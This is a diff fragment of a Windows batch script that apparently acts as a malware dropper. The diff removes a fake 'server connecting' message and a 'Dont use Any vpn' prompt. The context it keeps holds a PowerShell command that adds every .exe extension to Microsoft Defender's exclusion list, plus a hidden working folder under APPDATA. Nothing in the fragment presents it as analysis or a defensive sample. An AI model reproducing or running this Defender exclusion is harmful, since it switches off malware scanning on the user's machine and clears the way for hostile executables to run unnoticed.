@@ -27,9 +27,6 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 :--------------------------------------
 
-title server connecting......
-echo Dont use Any vpn and wait...
-
 Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 
 set "tempFolder=%APPDATA%\Roaming\otnahs"
